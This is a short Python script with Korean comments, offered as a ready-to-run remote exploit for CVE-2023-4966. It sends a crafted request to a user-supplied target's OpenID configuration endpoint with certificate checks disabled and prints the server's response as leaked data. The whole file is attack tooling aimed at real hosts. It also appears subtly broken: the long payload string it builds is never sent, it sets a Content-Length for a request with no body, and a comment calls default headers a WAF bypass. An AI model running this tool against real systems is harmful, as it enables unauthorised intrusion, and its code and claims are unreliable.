import requests
import argparse
import warnings
from urllib.parse import urlparse

# SSL 경고 무시
warnings.simplefilter('ignore', category=UserWarning)

# HTTP 요청 헤더 변조 (WAF 우회)
HEADERS = {
    "User-Agent": "Mozilla/5.0",
    "Content-Type": "application/x-www-form-urlencoded"
}

# CVE-2023-4966 Exploit
def exploit_cve_2023_4966(target_url):
    try:
        payload = "a" * 24576
        headers = HEADERS.copy()
        headers["Content-Length"] = str(len(payload))
        
        exploit_url = f"{target_url}/oauth/idp/.well-known/openid-configuration"
        response = requests.get(exploit_url, headers=headers, verify=False, allow_redirects=False, timeout=10)
        
        print("[DEBUG] Response Headers:", response.headers)
        print("[DEBUG] Response Body:", response.text[:500])  # 출력 길이 제한
        
        if response.status_code == 200:
            print("[SUCCESS] CVE-2023-4966 Exploit sent successfully!")
            print("Server Response:")
            print(response.text)
        else:
            print("[FAIL] CVE-2023-4966 Exploit failed. Check target and parameters.")
    except requests.exceptions.RequestException as err:
        print(f"[ERROR] {err}")
        print("[FAIL] Exploit attempt failed.")

# 메인 함수
def main():
    parser = argparse.ArgumentParser(
        description="CVE-2023-4966 Remote Exploit Tool",
        usage="python3 exploit.py --url <URL>"
    )
    parser.add_argument("--url", required=True, help="Target URL")
    args = parser.parse_args()

    print("[INFO] Attempting CVE-2023-4966 exploitation...")
    exploit_cve_2023_4966(args.url)

if __name__ == "__main__":
    main()
